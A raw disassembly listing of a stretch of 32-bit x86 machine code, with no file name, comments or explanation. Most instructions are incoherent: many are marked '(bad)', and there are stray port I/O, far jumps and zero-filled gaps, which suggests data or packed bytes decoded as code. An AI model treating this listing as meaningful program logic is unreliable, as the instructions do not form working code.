  4199ca:	lock sbb eax,0xff02a2f1
  4199d0:	fistp  DWORD PTR [ebx+0x44]
  4199d3:	add    BYTE PTR [edx-0x744eeea],al
  4199d9:	(bad)  
  4199da:	xor    BYTE PTR [ecx],bh
  4199dc:	dec    eax
  4199dd:	rol    DWORD PTR [ecx+0x5f7335e7],cl
  4199e3:	loope  0x41997e
  4199e5:	int3   
  4199e6:	aaa    
  4199e7:	rcr    DWORD PTR [ecx],cl
  4199e9:	(bad)  [ebp+ebp*1+0x2d4fec74]
  4199f0:	adc    ebx,DWORD PTR [ecx-0x53ec0004]
  4199f6:	and    ecx,DWORD PTR [eax]
  4199f8:	cld    
  4199f9:	aad    0xa7
  4199fb:	sbb    al,0x6b
  4199fd:	xlat   BYTE PTR ds:[ebx]
  4199fe:	rcl    ah,1
  419a00:	cmp    DWORD PTR [ecx],ecx
  419a02:	xor    BYTE PTR [edi-0x31],bh
  419a05:	jecxz  0x4199d1
  419a07:	adc    al,0x3d
  419a09:	push   cs
  419a0a:	aam    0x9
  419a0c:	push   0x1b389787
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x8dc215d3
  419a81:	pop    edx
  419a82:	repnz ins BYTE PTR es:[edi],dx
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    dl,bh
  419a8d:	aam    0xdf
  419a8f:	addr16 pop esi
  419a91:	ds inc edi
  419a93:	sbb    al,BYTE PTR [ebx]
  419a95:	test   al,0x80
  419a97:	aam    0x9d
  419a99:	fst    DWORD PTR [edx-0x6]
  419a9c:	in     al,dx
  419a9d:	jmp    0x419a7d
  419a9f:	sti    
  419aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa1:	pop    ds
  419aa2:	cs ss mov bh,bh
  419aa6:	fucomi st,st(3)
  419aa8:	cmp    edi,DWORD PTR [edi-0x21]
  419aab:	fisub  WORD PTR [ecx+0x64]
  419aae:	sar    eax,1
  419ab0:	push   ecx
  419ab1:	nop
  419ab2:	and    dh,ah
  419ab4:	xchg   DWORD PTR [esi-0x43],esi
  419ab7:	mov    es,WORD PTR [edx-0x75]
  419aba:	rol    BYTE PTR [esi],cl
  419abc:	mov    eax,ds:0x2f8dc8cc
  419ac1:	mov    al,ds:0x645c4533
  419ac6:	jmp    FWORD PTR [ecx]
  419ac8:	cli    
  419ac9:	xchg   edx,eax
  419aca:	or     BYTE PTR [ebp-0x4da97f8c],0x61
  419ad1:	cmp    ebp,DWORD PTR [edx-0x571ef50f]
  419ad7:	inc    esp
  419ad8:	sbb    DWORD PTR [edi+eax*4-0x6d4cfef2],0x315d6915
  419ae3:	mov    DWORD PTR [edx-0x2624415c],ebx
  419ae9:	cmc    
  419aea:	out    dx,al
  419aeb:	(bad)  
  419aec:	lock cmp DWORD PTR [eax+edx*4-0xc4575a2],eax
  419af4:	xor    DWORD PTR [edi],ecx
  419af6:	cli    
  419af7:	xor    al,0xc6
  419af9:	push   ebp
  419afa:	dec    edi
  419afb:	lock out dx,eax
  419afd:	jge    0x419ae7
  419aff:	es sbb eax,0x656e3ba0
  419b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b06:	out    0x69,eax
  419b08:	lods   eax,DWORD PTR ds:[esi]
  419b09:	dec    esi
  419b0a:	jae    0x419b6e
  419b0c:	push   edi
  419b0d:	std    
  419b0e:	add    DWORD PTR [eax-0x6c],ecx
  419b11:	neg    DWORD PTR [eax-0x538ba6ef]
  419b17:	xor    al,BYTE PTR [edx+0x3c]
  419b1a:	push   eax
  419b1b:	cmc    
  419b1c:	adc    ah,BYTE PTR [edi]
  419b1e:	mov    ?,WORD PTR [edx-0x53d51e4c]
  419b24:	xchg   edi,ecx
  419b26:	mov    bh,0xa3
  419b28:	cli    
  419b29:	nop
  419b2a:	gs retf 
  419b2c:	(bad)  
  419b2d:	mov    WORD PTR [esi],fs
  419b2f:	shl    DWORD PTR [ebp+0x12],0xdd
  419b33:	hlt    
  419b34:	jbe    0x419b5c
  419b36:	sub    eax,0xa3e85752
  419b3b:	orps   xmm1,XMMWORD PTR [edi]
  419b3e:	repnz cld 
  419b40:	cmp    cl,al
  419b42:	xor    DWORD PTR [esi+esi*2],esp
  419b45:	mov    eax,ds:0x8a63c62e
  419b4a:	xor    bh,BYTE PTR [ebp-0x13]
  419b4d:	(bad)  
  419b4e:	jle    0x419b90
  419b50:	imul   ecx,DWORD PTR [edx-0x42],0xffffffe3
  419b54:	jne    0x419ba4
  419b56:	imul   DWORD PTR [esi+edi*8]
  419b59:	jbe    0x419b7d
  419b5b:	xchg   DWORD PTR [ecx-0x2b],ebx
  419b5e:	jmp    0x9ac46917
  419b63:	adc    eax,0x3fc1accb
  419b68:	push   eax
  419b69:	shl    BYTE PTR [edi-0x45],0xcf
  419b6d:	add    ebx,ecx
  419b6f:	mov    ch,0xb7
  419b71:	cli    
  419b72:	or     bh,bl
  419b74:	iret   
  419b75:	fs mov ecx,0xc0741860
  419b7b:	outs   dx,BYTE PTR ds:[esi]
  419b7c:	sub    esi,DWORD PTR [esi-0x32]
  419b7f:	repnz dec ebx
  419b81:	inc    eax
  419b82:	adc    cl,BYTE PTR [edi]
  419b84:	idiv   BYTE PTR ds:0x20adda46
  419b8a:	pop    edx
  419b8b:	jbe    0x419b5c
  419b8d:	push   edx
  419b8e:	adc    BYTE PTR [ebp+0xa6],0x0
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xe7
  419c01:	aaa    
  419c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c03:	mov    eax,0x11112
  419c08:	add    eax,0xc8000001
  419c0d:	add    DWORD PTR [ebp-0x652834bd],0xffffff84
  419c14:	repz xor al,0x69
  419c17:	jg     0x419c3f
  419c19:	pop    esi
  419c1a:	mov    esp,0x14028ce8
  419c1f:	inc    edx
  419c20:	sbb    al,bl
  419c22:	rep lods al,BYTE PTR ds:[esi]
  419c24:	jge    0x419ca3
  419c26:	mul    DWORD PTR [edi+0x4a]
  419c29:	add    BYTE PTR [edi+0x46],ch
  419c2c:	pop    ss
  419c2d:	cwde   
  419c2e:	cmp    al,0xcb
  419c30:	addr16 mov ah,ch
  419c33:	xchg   edx,eax
  419c34:	sbb    ah,BYTE PTR [edi-0x4c]
  419c37:	popa   
  419c38:	adc    ebx,ebx
  419c3a:	ds mov ecx,ss
  419c3d:	ror    DWORD PTR [edx],cl
  419c3f:	sbb    dl,bl
  419c41:	test   eax,0x322ac4aa
  419c46:	adc    BYTE PTR [edx],ch
  419c48:	push   edx
  419c49:	pop    ecx
  419c4a:	mov    ecx,DWORD PTR [edi-0x253b73f5]
  419c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c51:	adc    BYTE PTR [ecx+eax*1],0xd9
  419c55:	push   0xce132e94
  419c5a:	sub    eax,0x256ca075
  419c5f:	and    edx,DWORD PTR ds:0x564bd283
  419c65:	mov    ds:0x1c12e344,al
  419c6a:	sbb    eax,0x52e2dc84
  419c6f:	in     eax,dx
  419c70:	dec    edx
  419c71:	sub    al,0x2
  419c73:	ss leave 
  419c75:	xor    ch,BYTE PTR [ebx]
  419c77:	jecxz  0x419cbb
  419c79:	mov    edi,0x88f0e799
  419c7e:	dec    eax
  419c7f:	bound  edx,QWORD PTR [esi]
  419c81:	xchg   ecx,eax
  419c82:	popa   
  419c83:	jmp    0xc01a:0xb06fc0be
  419c8a:	sub    BYTE PTR [ebx],bh
  419c8c:	xor    ecx,edx
  419c8e:	pop    ds
  419c8f:	and    dl,BYTE PTR [eax]
  419c91:	rcr    DWORD PTR [ecx+0x56cd43cc],cl
  419c97:	jecxz  0x419ca0
  419c99:	scas   eax,DWORD PTR es:[edi]
  419c9a:	rcl    DWORD PTR [ebx-0x3c0c56f1],0x98
  419ca1:	sti    
  419ca2:	push   0xb9e1318
  419ca7:	sbb    edi,DWORD PTR [eax-0x4ff56196]
  419cad:	sbb    DWORD PTR [edx],0x69865c2d
  419cb3:	jo     0x419ca9
  419cb5:	pop    esp
  419cb6:	retf   0x5f60
  419cb9:	(bad)  
  419cba:	scas   eax,DWORD PTR es:[edi]
  419cbb:	inc    ecx
  419cbc:	fild   DWORD PTR [ebp+0x63]
  419cbf:	fisub  DWORD PTR [edx-0x4]
  419cc2:	jne    0x419c54
  419cc4:	leave  
  419cc5:	hlt    
  419cc6:	int    0x96
  419cc8:	in     eax,dx
  419cc9:	out    0x90,eax
  419ccb:	fmul   st,st(0)
  419ccd:	mov    cl,0xa3
  419ccf:	pop    ebx
  419cd0:	arpl   WORD PTR [edx],dx
  419cd2:	xchg   esi,eax
  419cd3:	and    esp,DWORD PTR [ebx+0x38796d15]
  419cd9:	js     0x419d05
  419cdb:	pop    ebx
  419cdc:	stos   BYTE PTR es:[edi],al
  419cdd:	cld    
  419cde:	fsqrt  
  419ce0:	sbb    BYTE PTR [esi],dl
  419ce2:	push   ecx
  419ce3:	popf   
  419ce4:	stos   BYTE PTR es:[edi],al
  419ce5:	mov    BYTE PTR [ebp-0x54],ch
  419ce8:	retf   0x2ac0
  419ceb:	loope  0x419d39
  419ced:	push   esp
  419cee:	rcl    BYTE PTR [ebp-0x7f],1
  419cf1:	mov    edi,esp
  419cf3:	loop   0x419d0c
  419cf5:	loop   0x419c9c
  419cf7:	popf   
  419cf8:	jno    0x419c92
  419cfa:	pushf  
  419cfb:	clc    
  419cfc:	xchg   ebx,eax
  419cfd:	jp     0x419cd6
  419cff:	inc    edi
  419d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d01:	inc    esi
  419d02:	js     0x419d69
  419d04:	jno    0x419d29
  419d06:	jb     0x419c88
  419d08:	xchg   ebp,eax
  419d09:	pop    edi
  419d0a:	mov    ah,0x66
  419d0c:	and    eax,0x40ff9d76
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss (bad) 
  419d81:	das    
  419d82:	fisttp WORD PTR [ebp+0x17]
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x90000001,al
  419d8d:	and    al,0x40
  419d8f:	pop    ecx
  419d90:	jmp    0x4013:0xe4ed01ff
  419d97:	lahf   
  419d98:	xchg   ebx,eax
  419d99:	jl     0x419d70
  419d9b:	(bad)  [edi-0x2a]
  419d9e:	scas   eax,DWORD PTR es:[edi]
  419d9f:	outs   dx,DWORD PTR ds:[esi]
  419da0:	sub    DWORD PTR [esi+ecx*4-0x6bffacfc],edx
  419da7:	cmp    esi,DWORD PTR [ebx+0x395888e1]
  419dad:	ins    BYTE PTR es:[edi],dx
  419dae:	clc    
  419daf:	dec    ecx
  419db0:	xlat   BYTE PTR ds:[ebx]
  419db1:	ja     0x419da8
  419db3:	pop    ss
  419db4:	inc    esp
  419db5:	push   ss
  419db6:	mov    ecx,0x270c9dc6
  419dbb:	push   edx
  419dbc:	mov    DWORD PTR es:[ebx-0x3c9c134f],eax
  419dc3:	mov    al,0x2d
  419dc5:	test   DWORD PTR [ebx+eiz*8],esi
  419dc8:	or     eax,0x4bb331ae
  419dcd:	fwait
  419dce:	into   
  419dcf:	pop    eax
  419dd0:	push   edi
  419dd1:	inc    esp
  419dd2:	sub    BYTE PTR [edx],0x44
  419dd5:	imul   ecx,DWORD PTR [edx-0x74da3f9],0xffffffb4
  419ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ddd:	jbe    0x419daf
  419ddf:	jno    0x419e0d
  419de1:	in     eax,0x63
  419de3:	xchg   ebp,eax
  419de4:	push   ebx
  419de5:	int3   
  419de6:	ds mov eax,0x14d08bd0
  419dec:	ja     0x419e2b
  419dee:	dec    edi
  419def:	mov    dl,0xcd
  419df1:	push   esi
  419df2:	mov    al,0xca
  419df4:	pop    esp
  419df5:	sub    edi,DWORD PTR [ecx+eiz*4-0x15]
  419df9:	fimul  DWORD PTR [ecx]
  419dfb:	or     eax,0x5ea34d60
  419e00:	test   BYTE PTR [esi+ebp*8],bl
  419e03:	(bad)  
  419e04:	pop    edi
  419e05:	inc    esi
  419e06:	sti    
  419e07:	pushf  
  419e08:	and    al,0x33
  419e0a:	mov    BYTE PTR [ecx],bh
  419e0c:	cmp    BYTE PTR [eax],0x98
  419e0f:	xchg   ecx,eax
  419e10:	inc    ebx
  419e11:	cmc    
  419e12:	nop
  419e13:	fisubr DWORD PTR [eax+0x15956aee]
  419e19:	ins    BYTE PTR es:[edi],dx
  419e1a:	fcom   st(0)
  419e1c:	pusha  
  419e1d:	dec    edx
  419e1e:	push   0x6faf2734
  419e23:	mov    ch,bl
  419e25:	xchg   dh,dl
  419e27:	jecxz  0x419e3e
  419e29:	je     0x419dce
  419e2b:	lahf   
  419e2c:	xchg   ebx,eax
  419e2d:	inc    edi
  419e2e:	(bad)  
  419e2f:	add    al,0xd8
  419e31:	aad    0xce
  419e33:	adc    eax,0x231c7a32
  419e38:	jns    0x419e4e
  419e3a:	(bad)  
  419e3b:	test   BYTE PTR [edx],ah
  419e3d:	in     eax,0xcd
  419e3f:	inc    ecx
  419e40:	mov    edi,0xb54edac4
  419e45:	lock sub esi,ecx
  419e48:	mov    eax,ds:0x31a86494
  419e4d:	mov    ebx,0x63487180
  419e52:	and    BYTE PTR [esi],ch
  419e54:	fwait
  419e55:	mov    al,0x7a
  419e57:	xchg   edx,eax
  419e58:	inc    ebp
  419e59:	push   edx
  419e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e5b:	dec    esi
  419e5c:	push   ebp
  419e5d:	sbb    BYTE PTR [ecx-0x54],ah
  419e60:	dec    edx
  419e61:	test   DWORD PTR [edi+ebx*4+0x2d58ca13],edi
  419e68:	stc    
  419e69:	std    
  419e6a:	xor    al,BYTE PTR [edx-0x4b]
  419e6d:	cmp    al,0x45
  419e6f:	xchg   ebp,eax
  419e70:	or     al,BYTE PTR [edx-0x6023a980]
  419e76:	mov    WORD PTR es:[edi],gs
  419e79:	test   ebp,ebp
  419e7b:	imul   esi,DWORD PTR [ecx-0x3f],0x2eea93f
  419e82:	outs   dx,BYTE PTR ds:[esi]
  419e83:	mov    ebx,0x9a8a1076
  419e88:	adc    eax,0x5e620bc
  419e8d:	rol    DWORD PTR [ebp+0x5d3a],1
	...
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	adc    eax,0x1cd4ee5e
  419f05:	adc    eax,DWORD PTR [ecx]
  419f07:	add    BYTE PTR ds:0x73000001,al
  419f0d:	daa    
  419f0e:	jg     0x419ee5
  419f10:	mov    dh,bh
  419f12:	call   0xdedbfe7f
  419f17:	jmp    0x5f36:0x685ac76d
  419f1e:	cmp    ebp,DWORD PTR [eax]
  419f20:	scas   al,BYTE PTR es:[edi]
  419f21:	inc    esp
  419f22:	dec    ebx
  419f23:	repnz pop ebp
  419f25:	mov    ds:0x78db6c5a,al
  419f2a:	and    edx,DWORD PTR [ecx]
  419f2c:	mov    ah,0x7c
  419f2e:	sub    BYTE PTR [eax],0x4b
  419f31:	(bad)  
  419f32:	cs jns 0x419f41
  419f35:	jns    0x419fad
  419f37:	std    
  419f38:	cdq    
  419f39:	mov    eax,0xf3433a62
  419f3e:	jle    0x419f5d
  419f40:	push   edx
  419f41:	aad    0xb0
  419f43:	sub    al,0xe7
  419f45:	fnstsw WORD PTR [ecx-0x667ae226]
  419f4b:	and    DWORD PTR [ebx+ecx*1],esi
  419f4e:	pop    esp
  419f4f:	push   esi
  419f50:	and    eax,ebp
  419f52:	(bad)  
  419f53:	(bad)  
  419f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f55:	(bad)  
  419f56:	daa    
  419f57:	out    dx,al
  419f58:	sub    DWORD PTR [edx-0x63a757ec],ebx
  419f5e:	dec    ebp
  419f5f:	leave  
  419f60:	cld    
  419f61:	xchg   ecx,eax
  419f62:	mov    ebx,0xdaa3a501
  419f67:	pop    ebx
  419f68:	pop    esp
  419f69:	mov    ch,0x85
  419f6b:	lds    esp,FWORD PTR [esi+eax*1-0x5962a4d3]
  419f72:	ss or  BYTE PTR ss:[ecx],dl
  419f76:	mov    ah,0x99
  419f78:	sub    esi,esp
  419f7a:	pop    es
  419f7b:	add    esi,ecx
  419f7d:	(bad)  
  419f7e:	jmp    0x419fe7
  419f80:	int3   
  419f81:	and    BYTE PTR [ecx+0x6b15869f],ah
  419f87:	ss mov edx,0xc9aad0fb
  419f8d:	lock movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  419f90:	pcmpeqb mm3,mm2
  419f93:	xor    BYTE PTR ds:[ebx+0x59],cl
  419f97:	test   DWORD PTR [ecx-0x78625bf4],0x776209b2
  419fa1:	sbb    ebx,DWORD PTR [ebx-0x1b]
  419fa4:	test   eax,0xd727a2f1
  419fa9:	cmc    
  419faa:	das    
  419fab:	es sbb al,0x64
  419fae:	inc    ebx
  419faf:	das    
  419fb0:	cld    
  419fb1:	popf   
  419fb2:	inc    esp
  419fb3:	xor    eax,0xe55ebc11
  419fb8:	jle    0x419fce
  419fba:	or     BYTE PTR [edx+edi*8-0x23],cl
  419fbe:	xor    cl,bl
  419fc0:	sahf   
  419fc1:	imul   edi,DWORD PTR [esi],0x35
  419fc4:	sahf   
  419fc5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419fc7:	cdq    
  419fc8:	daa    
  419fc9:	mov    ch,0x3b
  419fcb:	and    eax,0xfca5c7a2
  419fd0:	mov    BYTE PTR [ecx+0x22dd9974],dl
  419fd6:	push   esp
  419fd7:	jmp    0xe3b1:0xf2243dac
  419fde:	mov    dh,0xed
  419fe0:	cld    
  419fe1:	push   esp
  419fe2:	aad    0x9
  419fe4:	pusha  
  419fe5:	in     al,dx
  419fe6:	outs   dx,DWORD PTR ds:[esi]
  419fe7:	lock xor DWORD PTR [eax+0x72fa821d],ebx
  419fee:	int    0xa7
  419ff0:	fst    DWORD PTR [edi+0x6d86db75]
  419ff6:	mov    ?,WORD PTR [edi+0x26]
  419ff9:	cmc    
  419ffa:	sar    DWORD PTR [esi],1
  419ffc:	test   BYTE PTR [edx-0x7f09225e],bh
  41a002:	mov    al,BYTE PTR ds:0xd1cc38
  41a008:	add    BYTE PTR [edi+0xc573578],cl
  41a00e:	cmp    DWORD PTR es:[eax+0x0],edi
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x7d],bh
  41a081:	stc    
  41a082:	cmp    dh,BYTE PTR [edx+0x21]
  41a085:	adc    al,0x1
  41a087:	add    BYTE PTR ds:0xc9000001,al
  41a08d:	dec    esp
  41a08e:	mov    bl,0x64
  41a090:	inc    ebp
  41a091:	stos   BYTE PTR es:[edi],al
  41a092:	push   ecx
  41a093:	jne    0x41a0c0
  41a095:	adc    DWORD PTR [esp+ebp*1],ebp
  41a098:	pop    esi
  41a099:	cdq    
  41a09a:	cs gs js 0x41a062
  41a09e:	push   edx
  41a09f:	sbb    BYTE PTR [edi-0x9],cl
  41a0a2:	cmp    bh,al
  41a0a4:	jae    0x41a051
  41a0a6:	jb     0x41a0d9
  41a0a8:	ss retf 0xc276
  41a0ac:	pop    ebp
  41a0ad:	cli    
  41a0ae:	enter  0xd1d8,0x1a
  41a0b2:	push   es
  41a0b3:	and    ch,0xe
  41a0b6:	adc    ecx,0x559410d4
  41a0bc:	cmp    ch,bl
  41a0be:	leave  
  41a0bf:	xchg   ecx,eax
  41a0c0:	push   edi
  41a0c1:	call   0xdc7c2dd6
  41a0c6:	retf   
  41a0c7:	lea    ebp,[eax*4+0x4fc7c978]
  41a0ce:	dec    ecx
  41a0cf:	xchg   esi,eax
  41a0d0:	outs   dx,DWORD PTR ds:[esi]
  41a0d1:	mov    al,0x8e
  41a0d3:	lods   al,BYTE PTR ds:[esi]
  41a0d4:	pop    esp
  41a0d5:	dec    esp
  41a0d6:	fidiv  WORD PTR [ecx-0x547414c8]
  41a0dc:	pop    ebp
  41a0dd:	pop    es
  41a0de:	xor    ch,BYTE PTR [edx+0xf]
  41a0e1:	adc    ebp,DWORD PTR [eax+eiz*2+0x35f55f2e]
  41a0e8:	sbb    BYTE PTR [eax+0x76],0x6d
  41a0ec:	push   eax
  41a0ed:	fwait
  41a0ee:	sbb    eax,0xcf68a646
  41a0f3:	mov    eax,ds
  41a0f5:	mov    ?,eax
  41a0f7:	popa   
  41a0f8:	add    eax,0x1eedee4a
  41a0fd:	or     eax,0x22f7c22e
  41a102:	and    eax,0xc235121a
  41a107:	fmul   QWORD PTR [esi+ebp*8]
  41a10a:	jne    0x41a14c
  41a10c:	mov    esi,0x1e4e9035
  41a111:	xor    al,0x13
  41a113:	add    al,0xc1
  41a115:	sbb    ah,BYTE PTR [ecx]
  41a117:	mov    ch,0x6b
  41a119:	stc    
  41a11a:	push   ebp
  41a11b:	jne    0x41a185
  41a11d:	jle    0x41a112
  41a11f:	push   esi
  41a120:	dec    ebx
  41a121:	(bad)  
  41a122:	sbb    dl,bl
  41a124:	(bad)  
  41a125:	mov    esi,0x5a1c8323
  41a12a:	inc    ebx
  41a12b:	adc    bh,BYTE PTR [ecx-0x42120947]
  41a131:	and    eax,0x987cdd24
  41a136:	sub    ecx,DWORD PTR [ecx+0x7e]
  41a139:	push   ss
  41a13a:	dec    ecx
  41a13b:	in     eax,dx
  41a13c:	jne    0x41a125
  41a13e:	in     al,0x7b
  41a140:	mov    edx,0x1f83fcdd
  41a145:	cli    
  41a146:	xchg   DWORD PTR [ecx],edi
  41a148:	mov    bh,0x79
  41a14a:	inc    edx
  41a14b:	jo     0x41a0f9
  41a14d:	je     0x41a1b6
  41a14f:	lods   al,BYTE PTR ds:[esi]
  41a150:	mov    ecx,0x83a77e80
  41a155:	push   ebx
  41a156:	loopne 0x41a1bd
  41a158:	stos   BYTE PTR es:[edi],al
  41a159:	repz dec edi
  41a15b:	inc    ebx
  41a15c:	xchg   edx,eax
  41a15d:	mov    ds:0x32fb26e5,al
  41a162:	inc    ebp
  41a163:	(bad)  
  41a164:	jne    0x41a182
  41a166:	(bad)  
  41a167:	lea    eax,[esi+0x5ce9d4e3]
  41a16d:	out    dx,al
  41a16e:	and    ah,BYTE PTR [edx+0x21494089]
  41a174:	cmp    DWORD PTR [eax],edx
  41a176:	scas   al,BYTE PTR es:[edi]
  41a177:	and    DWORD PTR [ecx+0x46],0x64
  41a17b:	inc    edi
  41a17c:	cli    
  41a17d:	xchg   esi,eax
  41a17e:	mov    dh,0x6a
  41a180:	in     al,0xe2
  41a182:	arpl   WORD PTR ds:0xeef50f0a,sp
  41a188:	fdivr  QWORD PTR [ebp+0x4d]
  41a18b:	dec    ecx
  41a18c:	lods   eax,DWORD PTR ds:[esi]
  41a18d:	inc    esi
  41a18e:	and    esp,ebx
  41a190:	popa   
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	sub    al,0xc4
  41a202:	call   0x500:0x1152671
  41a209:	add    DWORD PTR [eax],eax
  41a20b:	add    BYTE PTR [ebp-0x27ea95c0],bl
  41a211:	popa   
  41a212:	addr16 lahf 
  41a214:	outs   dx,BYTE PTR ds:[esi]
  41a215:	sbb    ah,BYTE PTR [esi+0x2e569be7]
  41a21b:	lods   eax,DWORD PTR ds:[esi]
  41a21c:	sub    al,0xaa
  41a21e:	js     0x41a1d9
  41a220:	pop    esp
  41a221:	mov    BYTE PTR [esi+edx*4-0x38ce31d7],bh
  41a228:	pop    es
  41a229:	outs   dx,BYTE PTR ds:[esi]
  41a22a:	out    0x71,eax
  41a22c:	mov    fs:0x1e609c1a,al
  41a232:	pop    esi
  41a233:	push   ds
  41a234:	sbb    DWORD PTR [ecx+0x6134fee5],edi
  41a23a:	cld    
  41a23b:	xchg   ebp,eax
  41a23c:	ret    0x4761
  41a23f:	mov    ebp,0x1703adee
  41a244:	lods   eax,DWORD PTR ds:[esi]
  41a245:	jae    0x41a272
  41a247:	lahf   
  41a248:	pop    ebx
  41a249:	sbb    BYTE PTR [esi+0x11],0x7e
  41a24d:	fs ins DWORD PTR es:[edi],dx
  41a24f:	inc    ebx
  41a250:	sbb    al,BYTE PTR [ebx+0x41e6ce73]
  41a256:	rcr    BYTE PTR [eax+ebx*8+0xb],1
  41a25a:	rol    DWORD PTR [ecx+0x2],0x59
  41a25e:	dec    ebx
  41a25f:	jge    0x41a273
  41a261:	(bad)  
  41a262:	adc    DWORD PTR ss:[eax-0x73499c47],edi
  41a269:	into   
  41a26a:	pop    ds
  41a26b:	pushf  
  41a26c:	jp     0x41a2c5
  41a26e:	ret    
  41a26f:	dec    edx
  41a270:	imul   BYTE PTR [ebp-0x36]
  41a273:	scas   al,BYTE PTR es:[edi]
  41a274:	aas    
  41a275:	clc    
  41a276:	and    edi,DWORD PTR [edx]
  41a278:	sub    eax,0x99600e34
  41a27d:	xlat   BYTE PTR ds:[ebx]
  41a27e:	por    mm6,mm3
  41a281:	xchg   BYTE PTR [edi-0x60ab6509],ch
  41a287:	in     eax,0x13
  41a289:	fadd   DWORD PTR [eax-0x77fd134]
  41a28f:	jbe    0x41a23f
  41a291:	arpl   bx,bp
  41a293:	outs   dx,DWORD PTR ds:[esi]
  41a294:	lods   eax,DWORD PTR cs:[esi]
  41a296:	mov    ds:0xdb8458b3,eax
  41a29b:	stc    
  41a29c:	mov    ah,0xda
  41a29e:	repnz cmc 
  41a2a0:	sbb    ah,al
  41a2a2:	test   eax,0x4a624b48
  41a2a7:	xor    DWORD PTR [ebp-0x217dd469],edi
  41a2ad:	and    ecx,esp
  41a2af:	push   ecx
  41a2b0:	pop    ebx
  41a2b1:	adc    DWORD PTR [ecx],esi
  41a2b3:	or     DWORD PTR [esi],ebp
  41a2b5:	jb     0x41a259
  41a2b7:	dec    ebp
  41a2b8:	add    esp,DWORD PTR [ebx-0x3e]
  41a2bb:	sub    al,0xf4
  41a2bd:	jl     0x41a31e
  41a2bf:	rcr    DWORD PTR ds:0x24c8e604,1
  41a2c5:	cld    
  41a2c6:	mov    al,ds:0xf650a426
  41a2cb:	sbb    al,BYTE PTR ds:0xb331bb56
  41a2d1:	mov    al,0xe3
  41a2d3:	pop    ebp
  41a2d4:	je     0x41a29c
  41a2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2d7:	aam    0x34
  41a2d9:	ins    DWORD PTR es:[edi],dx
  41a2da:	xor    al,0xe
  41a2dc:	push   edx
  41a2dd:	sbb    al,0xcd
  41a2df:	pop    ss
  41a2e0:	ucomiss xmm6,DWORD PTR [ecx-0x7b9238d3]
  41a2e7:	or     edi,DWORD PTR [esi]
  41a2e9:	int3   
  41a2ea:	int    0x73
  41a2ec:	jmp    0x3502f460
  41a2f1:	in     al,0xe2
  41a2f3:	ja     0x41a2dd
  41a2f5:	call   0xc112:0x6afc4ec2
  41a2fc:	lock loop 0x41a283
  41a2ff:	push   edi
  41a300:	mov    ds:0x299d5590,eax
  41a305:	jg     0x41a28b
  41a307:	mov    ?,WORD PTR [ebx-0x372cecf1]
  41a30d:	sbb    al,dl
  41a30f:	stos   BYTE PTR es:[edi],al
  41a310:	pop    ebp
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0xd4a6955c
  41a381:	or     ecx,esi
  41a383:	mov    eax,ds:0x1162b
  41a388:	add    eax,0x1
  41a38d:	stos   BYTE PTR es:[edi],al
  41a38e:	int3   
  41a38f:	fstp   st(7)
  41a391:	call   0xf0ee:0x5dbf272d
  41a398:	je     0x41a375
  41a39a:	push   edi
  41a39b:	jle    0x41a379
  41a39d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39e:	add    edi,DWORD PTR [ebx-0x713239fe]
  41a3a4:	jmp    0xe4451a55
  41a3a9:	pop    edi
  41a3aa:	push   cs
  41a3ab:	and    DWORD PTR fs:[ebx+0x3f],edi
  41a3af:	mov    ah,0x29
  41a3b1:	xchg   esp,eax
  41a3b2:	loop   0x41a3a6
  41a3b4:	aaa    
  41a3b5:	rcr    BYTE PTR [ecx],0xe5
  41a3b8:	rol    DWORD PTR [edx],cl
  41a3ba:	std    
  41a3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3bc:	jl     0x41a3c5
  41a3be:	pop    ds
  41a3bf:	bound  edi,QWORD PTR [ebp-0x29]
  41a3c2:	mov    ch,0x9f
  41a3c4:	inc    esi
  41a3c5:	dec    eax
  41a3c6:	mov    cl,0xb7
